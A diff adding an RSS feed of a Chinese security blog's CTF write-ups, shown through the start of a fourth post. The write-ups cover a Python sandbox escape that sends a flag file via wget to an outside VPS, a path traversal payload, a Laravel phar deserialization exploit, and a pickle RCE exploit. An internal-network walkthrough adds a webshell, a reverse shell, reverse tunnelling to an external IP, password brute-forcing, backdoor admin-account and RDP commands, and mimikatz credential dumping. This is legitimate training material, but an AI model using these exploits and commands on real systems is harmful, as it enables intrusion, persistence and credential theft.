@@ -1,0 +1,827 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>ctf on Ca1s1&#39;Blog</title>
+    <link>https://vuln.top/tags/ctf/</link>
+    <description>Recent content in ctf on Ca1s1&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 05 Sep 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://vuln.top/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>观安CTF 2021 WriteUp</title>
+      <link>https://vuln.top/posts/guanan2021wp/</link>
+      <pubDate>Sun, 05 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://vuln.top/posts/guanan2021wp/</guid>
+      <description>WEB Baby Calc 通过测试发现该环境为python3沙盒逃逸 通过网上公开的POC发现存在代码执行，但是无法回显 尝试反弹SHELL均失败 发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps
+如下图使用wget，把命令包含在``中在使用base64带到vps中 expr=__import__(&amp;#34;os&amp;#34;).__getattribute__(&amp;#34;metsys&amp;#34;[::-1])(&amp;#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep%20flag|base64`&amp;#34;) vps监听： Baby WEB 题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞
+POC:1|../../../../../../../../flag|
+注册任意用户名，密码为POC，登陆密码为1。 登陆后返回flag Misc 老电脑的内存 经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息 查看缓存在内存中的注册表： 获取 SAM 表中的用户： 查看内存中系统的密码： CMD5解密 通过filescan查找ctf用户下的文件 发现1.png
+volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf 将1.png dump下来，查看文件。与密码结合获得flag ##被加密的wifi 通过分析数据包发现key为88888888 通过airdecap-ng命令输入密码解密数据包 在已解密的数据包中找到flag release 拿到一张图片，首先使用binwalk分离文件，没有发现有用信息 通过winhex修改文件高度 得到一半flag 翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1 使用脚本转换为图片，得到二维码 扫描得到flag</description>
+      <content>&lt;h1 id=&#34;web&#34;&gt;WEB&lt;/h1&gt;
+&lt;h2 id=&#34;baby-calc&#34;&gt;Baby Calc&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;通过测试发现该环境为python3沙盒逃逸
+通过网上公开的POC发现存在代码执行，但是无法回显
+尝试反弹SHELL均失败
+发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;如下图使用wget，把命令包含在``中在使用base64带到vps中
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;expr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;__import__(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;os&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__getattribute__(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;metsys&amp;#34;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%20f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;lag|base64`&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;vps监听：
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;baby-web&#34;&gt;Baby WEB&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308507210959.jpg&#34; alt=&#34;-w1134&#34;&gt;
+POC:&lt;code&gt;1|../../../../../../../../flag|&lt;/code&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;注册任意用户名，密码为POC，登陆密码为1。
+登陆后返回flag
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308507640380.jpg&#34; alt=&#34;-w552&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;misc&#34;&gt;Misc&lt;/h1&gt;
+&lt;h2 id=&#34;老电脑的内存&#34;&gt;老电脑的内存&lt;/h2&gt;
+&lt;p&gt;经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308508816927.jpg&#34; alt=&#34;-w966&#34;&gt;
+查看缓存在内存中的注册表：
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308508960121.jpg&#34; alt=&#34;-w996&#34;&gt;
+获取 SAM 表中的用户：
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308509103690.jpg&#34; alt=&#34;-w1005&#34;&gt;
+查看内存中系统的密码：
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308509224912.jpg&#34; alt=&#34;-w969&#34;&gt;
+CMD5解密
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308509294061.jpg&#34; alt=&#34;-w909&#34;&gt;
+通过filescan查找ctf用户下的文件 发现1.png&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308509546496.jpg&#34; alt=&#34;-w1002&#34;&gt;
+将1.png dump下来，查看文件。与密码结合获得flag
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308509648154.jpg&#34; alt=&#34;-w915&#34;&gt;
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308509739729.jpg&#34; alt=&#34;-w997&#34;&gt;
+##被加密的wifi
+通过分析数据包发现key为88888888
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308510039551.jpg&#34; alt=&#34;-w528&#34;&gt;
+通过airdecap-ng命令输入密码解密数据包
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308510142741.jpg&#34; alt=&#34;-w695&#34;&gt;
+在已解密的数据包中找到flag
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308510348552.jpg&#34; alt=&#34;-w974&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;release&#34;&gt;release&lt;/h2&gt;
+&lt;p&gt;拿到一张图片，首先使用&lt;code&gt;binwalk&lt;/code&gt;分离文件，没有发现有用信息
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308511070136.jpg&#34; alt=&#34;-w696&#34;&gt;
+通过winhex修改文件高度
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308511475227.jpg&#34; alt=&#34;-w813&#34;&gt;
+得到一半flag
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308511600485.jpg&#34; alt=&#34;-w805&#34;&gt;
+翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308512337387.jpg&#34; alt=&#34;-w854&#34;&gt;
+使用脚本转换为图片，得到二维码
+&lt;img src=&#34;https://h1dery.github.io/2021/09/05/16308495601985/16308512567725.jpg&#34; alt=&#34;-w826&#34;&gt;
+扫描得到flag&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>2021年虎符线下赛WEB</title>
+      <link>https://vuln.top/posts/hufuctfweb/</link>
+      <pubDate>Sun, 09 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://vuln.top/posts/hufuctfweb/</guid>
+      <description>tinypng 题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架 首先查看路由信息 先查看一下fileupload路由，可以发现文件上传时对内容进行了过滤，且只允许上传png 接着我们看image路由，进入ImageController，$source可控接着判断是否为png结尾，如果为png结尾则传给imgcompress类。 进入imgcompress类，$this-&amp;gt;src为我们传入的$source 接着又传递给compressImg类，调用了openImg方法 将$source传递给了getimagesize，getimagesize可以触发phar反序列化 现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。 从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。
+namespace Illuminate\Broadcasting {class PendingBroadcast {protected $events;protected $event;public function __construct($events, $event) {$this-&amp;gt;events = $events;$this-&amp;gt;event = $event;}}class BroadcastEvent {public $connection;public function __construct($connection) {$this-&amp;gt;connection = $connection;}}}namespace Illuminate\Bus {class Dispatcher {protected $queueResolver;public function __construct($queueResolver){$this-&amp;gt;queueResolver = $queueResolver;}}}namespace {$c = new Illuminate\Broadcasting\BroadcastEvent(&amp;#39;whoami&amp;#39;);$b = new Illuminate\Bus\Dispatcher(&amp;#39;system&amp;#39;);$a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);#print(urlencode(serialize($a)));@unlink(&amp;#34;phar.</description>
+      <content>&lt;h2 id=&#34;tinypng&#34;&gt;tinypng&lt;/h2&gt;
+&lt;p&gt;题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120346.png&#34; alt=&#34;&#34;&gt;
+首先查看路由信息
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120417.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;先查看一下&lt;code&gt;fileupload&lt;/code&gt;路由，可以发现文件上传时对内容进行了过滤，且只允许上传&lt;code&gt;png&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120443.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着我们看image路由，进入&lt;code&gt;ImageController&lt;/code&gt;，&lt;code&gt;$source&lt;/code&gt;可控接着判断是否为&lt;code&gt;png&lt;/code&gt;结尾，如果为&lt;code&gt;png&lt;/code&gt;结尾则传给&lt;code&gt;imgcompress&lt;/code&gt;类。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120510.png&#34; alt=&#34;&#34;&gt;
+进入&lt;code&gt;imgcompress&lt;/code&gt;类，&lt;code&gt;$this-&amp;gt;src&lt;/code&gt;为我们传入的&lt;code&gt;$source&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120529.png&#34; alt=&#34;&#34;&gt;
+接着又传递给&lt;code&gt;compressImg&lt;/code&gt;类，调用了&lt;code&gt;openImg&lt;/code&gt;方法
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120551.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;$source&lt;/code&gt;传递给了&lt;code&gt;getimagesize&lt;/code&gt;，&lt;code&gt;getimagesize&lt;/code&gt;可以触发&lt;code&gt;phar&lt;/code&gt;反序列化
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120612.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。
+从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-&lt;?php&#34; data-lang=&#34;&lt;?php&#34;&gt;namespace Illuminate\Broadcasting {
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct($events, $event) {
+            $this-&amp;gt;events = $events;
+            $this-&amp;gt;event = $event;
+        }
+    }
+
+    class BroadcastEvent {
+        public $connection;
+        public function __construct($connection) {
+            $this-&amp;gt;connection = $connection;
+        }
+    }
+}
+
+namespace Illuminate\Bus {
+    class Dispatcher {
+        protected $queueResolver;
+        public function __construct($queueResolver){
+            $this-&amp;gt;queueResolver = $queueResolver;
+        }
+    }
+}
+
+
+namespace {
+    $c = new Illuminate\Broadcasting\BroadcastEvent(&amp;#39;whoami&amp;#39;);
+    $b = new Illuminate\Bus\Dispatcher(&amp;#39;system&amp;#39;);
+    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
+    #print(urlencode(serialize($a)));
+    @unlink(&amp;#34;phar.phar&amp;#34;);
+    $phar=new Phar(&amp;#34;phar.phar&amp;#34;);
+    $phar-&amp;gt;startBuffering();
+    $phar-&amp;gt;setStub(&amp;#39;GIF89a&amp;#39;.&amp;#34;__HALT_COMPILER();&amp;#34;);
+    $phar-&amp;gt;setMetadata($a);
+    $phar-&amp;gt;addFromString(&amp;#34;test.txt&amp;#34;, &amp;#34;test&amp;#34;);
+    $phar-&amp;gt;stopBuffering();
+}
+ 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过如上exp生成&lt;code&gt;phar&lt;/code&gt;文件，使用&lt;code&gt;gzip&lt;/code&gt;打包修改为png后缀
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120640.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;上传文件
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;访问&lt;code&gt;/image?image=phar://../storage/app/uploads/xx.png&lt;/code&gt;，成功代码执行
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120747.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;easyflask&#34;&gt;Easyflask&lt;/h2&gt;
+&lt;p&gt;根据页面提示访问&lt;code&gt;/file?file=/app/source&lt;/code&gt;可以获取到源代码
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120805.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;把代码复制到本地编辑器，便于分析。可以看到&lt;code&gt;file&lt;/code&gt;路由为文件读取，对后缀存在一定限制，但是也可以读取到部分文件。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120823.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在代码头部发现SECRET_KEY存放在环境变量中
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120839.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们可以通过读取/proc/self/environ文件，获得SECRET_KEY
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120853.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着看admin路由存在pickle.loads，u参数可控那么就存在python反序列化漏洞（参考https://daolgts.github.io/2019/09/20/python%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/）
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120916.png&#34; alt=&#34;&#34;&gt;
+编写并运行EXP脚本，获得一串BASE64&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-import&#34; data-lang=&#34;import&#34;&gt;import pickle
+import os
+
+class User(object):
+    def __reduce__(self):
+        a = &amp;#34;`cat /flag &amp;gt;/tmp/1.txt `&amp;#34;
+        return (os.system,(a,))
+
+u = pickle.dumps(User())
+print(u)
+bu = base64.b64encode(u)
+print(bu)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着通过获取到的KEY，使用脚本伪造FLASK的Session（https://github.com/noraj/flask-session-cookie-manager）
+-s参数为SECRET_KEY，-t 参数为反序列化的内容
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过生成出的Session访问/admin路径，返回500为成功
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121023.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着进行文件读取获得flag
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121037.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>CTF内网渗透题</title>
+      <link>https://vuln.top/posts/ctfneiwang/</link>
+      <pubDate>Thu, 15 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://vuln.top/posts/ctfneiwang/</guid>
+      <description>记一次CTF内网渗透，据说是从护网复现过来的。
+这是第一个flag。。。 既然我们知道这是wordpress正常套路那我们通过wpscan扫描一下
+如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下 参考：Wordpress xmlrpc.php -common vulnerabilites &amp;amp; how to exploit them 通过文章发布的地方知道存在一个power_admin的用户 通过xmlrpc.php验证一下 不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。 在媒体库内直接上传冰蝎一句话后访问正常操作 之后通过冰蝎配合msf反弹shell 内网穿透我比较常用的手法是通过ew配合proxychains 如何通过EW做Socks5代理进行内网渗透 - 知乎 ew for linux下载地址：ew
+首先在公网的vps上通过ew监听1080和1024 ./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp;amp; 之后通过msf把ew客户端上传到靶机上
+meterpreter &amp;gt; upload /root/ew/ew_for_linux64 /tmp/ [*] uploading : /root/ew/ew_for_linux64 -&amp;gt; /tmp/ [*] uploaded : /root/ew/ew_for_linux64 -&amp;gt; /tmp//ew_for_linux64 meterpreter &amp;gt; meterpreter &amp;gt; shell Process 20657 created. Channel 0 created. cd /tmp chmod 777 ew_for_linux64 ./ew_for_linux64 -s rssocks -d 118.</description>
+      <content>&lt;blockquote&gt;
+&lt;p&gt;记一次CTF内网渗透，据说是从护网复现过来的。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;这是第一个flag。。。&lt;/code&gt;
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/XYVLCT.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/XYVLCT.png&#34; alt=&#34;a.md.png&#34;&gt;&lt;/a&gt;
+既然我们知道这是wordpress正常套路那我们通过&lt;code&gt;wpscan&lt;/code&gt;扫描一下&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下
+参考：&lt;a href=&#34;https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32&#34;&gt;Wordpress xmlrpc.php -common vulnerabilites &amp;amp; how to exploit them&lt;/a&gt;
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/YygAkD.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/YygAkD.png&#34; alt=&#34;QQ20191012000758.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;通过文章发布的地方知道存在一个power_admin的用户
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4jKvvY.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4jKvvY.png&#34; alt=&#34;SWYT13G1LF0YTM8V3M9A.png&#34;&gt;&lt;/a&gt;
+通过&lt;code&gt;xmlrpc.php&lt;/code&gt;验证一下
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/ZpUhR0.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/ZpUhR0.png&#34; alt=&#34;HFT3U203JYN_0GXU0X7.md.png&#34;&gt;&lt;/a&gt;
+不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hwSKJa.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hwSKJa.png&#34; alt=&#34;NC85I4XP14RYQZOMYHK.md.png&#34;&gt;&lt;/a&gt;
+在媒体库内直接上传冰蝎一句话后访问正常操作
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/olvWei.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/olvWei.png&#34; alt=&#34;9219XMTIHPMKF937Y.png&#34;&gt;&lt;/a&gt;
+之后通过冰蝎配合msf反弹shell
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Tn6BvB.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Tn6BvB.png&#34; alt=&#34;1E42VR__1LT_7UMYS6E.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;内网穿透我比较常用的手法是通过ew配合proxychains
+&lt;a href=&#34;https://zhuanlan.zhihu.com/p/32822159&#34;&gt;如何通过EW做Socks5代理进行内网渗透 - 知乎&lt;/a&gt;
+ew for linux下载地址：&lt;a href=&#34;http://118.126.66.150/ew_for_linux64&#34;&gt;ew&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;首先在公网的vps上通过ew监听1080和1024
+&lt;code&gt;./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp;amp; &lt;/code&gt;
+之后通过msf把ew客户端上传到靶机上&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; upload /root/ew/ew_for_linux64 /tmp/
+[*] uploading  : /root/ew/ew_for_linux64 -&amp;gt; /tmp/
+[*] uploaded   : /root/ew/ew_for_linux64 -&amp;gt; /tmp//ew_for_linux64
+meterpreter &amp;gt; 
+meterpreter &amp;gt; shell
+Process 20657 created.
+Channel 0 created.
+cd /tmp
+chmod 777 ew_for_linux64
+./ew_for_linux64 -s rssocks -d 118.126.66.150 -e 1024
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在配置一下本地kali的proxychains
+编辑&lt;code&gt;/etc/proxychains.conf&lt;/code&gt;,在最下面一行修改为公网vps的地址和端口
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/T1FNkx.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/T1FNkx.png&#34; alt=&#34;K5Y013PSU5M83UBVBXPV.png&#34;&gt;&lt;/a&gt;
+正确配置后就可愉快的探索内网了，如下图通过&lt;code&gt;proxychains nmap -sT 192.168.1.2 -Pn&lt;/code&gt;扫描1.2主机的端口，这里我就不扫描内网了可以通过msf的模块扫描，我这里直接通过webshell尝试ping邻居的IP来获取主机（注意icmp协议是无法通过proxychains传递的）。
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/5wFub4.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/5wFub4.png&#34; alt=&#34;3ZNZLFWSSM47GFEU2O.png&#34;&gt;&lt;/a&gt;
+发现存在1433端口通过hydra爆破密码，我前面已经爆破过了所以知道密码是123456演示一下，hydra命令我就不解释了看下help文档就会了。
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/GJuZ6d.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/GJuZ6d.png&#34; alt=&#34;0W970XQWF9T7WQWXJGN2E.md.png&#34;&gt;&lt;/a&gt;
+通过&lt;code&gt;proxychains msfconsole&lt;/code&gt;使用&lt;code&gt;use auxiliary/admin/mssql/mssql_exec&lt;/code&gt;模块执行命令
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/KMudsD.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/KMudsD.png&#34; alt=&#34;QQ20191012010458.png&#34;&gt;&lt;/a&gt;
+添加账户设置管理员，开启3389&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net user 1111 abc.123 /add
+net localgroup administrators 1111 /add
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;#34; &amp;#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hZFi47.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/hZFi47.png&#34; alt=&#34;NY5_FWI1V_B79CBEDMU.png&#34;&gt;&lt;/a&gt;
+现在可以通过rdesktop直接访问
+&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Bb1WIQ.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/Bb1WIQ.png&#34; alt=&#34;HTE8Q1ILEEY59JQ0_V2.png&#34;&gt;&lt;/a&gt;
+上传神奇mimikz！！获取管理员密码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
+sekurlsa::logonpasswords
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/eb6d61.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/eb6d61.png&#34; alt=&#34;BKJXCL2EW5SSLEMFR.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3xtF0N.png&#34;&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3xtF0N.png&#34; alt=&#34;YWY4ZGBZMJEAMOVV7O.png&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;还有一台主机通过密码flag3{xxxx}账号administrator直接远程桌面连接即可&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>2019神盾杯</title>
+      <link>https://vuln.top/posts/2019shendun/</link>
+      <pubDate>Sun, 23 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://vuln.top/posts/2019shendun/</guid>
+      <description>首届“神盾杯”上海市网络安全竞赛，去年的比赛。
+0x00 babyJS 操作内容：
+查看源码 找不到被调用的CheckLogin函数
+看到script中有用到unespace和escape等函数 用于编码字符串
+将eval传参改为alert 显示为弹窗
+发现check函数 并将flag与用户输入做比较 得到flag
+FLAG值：
+flag{a5a5f402f6dc62acd3e848900a17513f}
+0x01 crypto_easy_1 操作内容：
+下载文件
+发现3行类似的数据 并且长度一致。
+:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度
+长度一致 为42
+异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag
+解密脚本如下:
